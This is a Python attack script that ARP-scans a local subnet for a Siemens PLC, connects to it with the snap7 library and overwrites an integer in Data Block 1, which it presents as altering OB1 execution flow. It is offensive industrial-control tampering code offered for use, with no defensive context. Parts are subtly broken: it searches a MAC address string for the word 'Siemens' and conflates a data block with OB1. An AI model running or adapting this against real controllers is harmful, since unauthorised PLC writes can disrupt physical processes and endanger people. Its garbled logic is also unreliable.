import scapy.all as scapy
import snap7
from snap7.util import get_int, set_int
from snap7.types import Areas

# Function to find PLC's IP Address on the network
def find_plc_ip():
    print("[*] Scanning the network for the PLC...")
    arp_req = scapy.ARP(pdst="192.168.1.0/24")  # Change subnet if necessary
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_packet = broadcast / arp_req
    
    answered_list = scapy.srp(arp_packet, timeout=2, verbose=False)[0]
    
    for sent, received in answered_list:
        if "Siemens" in received.hwsrc:
            print(f"[+] Found Siemens PLC at: {received.psrc}")
            return received.psrc  # Return the PLC's IP
    
    print("[-] No Siemens PLC found.")
    return None

# Function to modify OB1 in the PLC
def modify_plc_ob1(plc_ip):
    print("[*] Connecting to PLC...")
    
    try:
        plc = snap7.client.Client()
        plc.connect(plc_ip, 0, 1)  # (IP, Rack, Slot) - Adjust accordingly
        
        if plc.get_connected():
            print("[+] Connected to PLC!")
            
            db_number = 1  # Data Block 1 (example)
            start_address = 0  # Modify as per PLC memory structure
            size = 2  # Size of data to be modified
            
            # Read current OB1 data from Data Block 1
            data_block = plc.read_area(Areas.DB, db_number, start_address, size)
            current_value = get_int(data_block, 0)
            print(f"[+] Current OB1 Execution Parameter: {current_value}")

            # Modify OB1 behavior by setting a new arbitrary execution logic
            new_value = 1234  # Example value to modify execution flow
            set_int(data_block, 0, new_value)
            
            # Write the modified data back to the PLC
            plc.write_area(Areas.DB, db_number, start_address, data_block)
            print(f"[+] Modified OB1 execution parameter to: {new_value}")

            # Disconnect
            plc.disconnect()
            print("[+] Modification successful and disconnected from PLC.")

        else:
            print("[-] Failed to connect to PLC.")
    
    except Exception as e:
        print(f"[-] Error: {e}")

# Main execution
plc_ip = find_plc_ip()
if plc_ip:
    modify_plc_ob1(plc_ip)
else:
    print("[-] Exiting. No PLC detected.")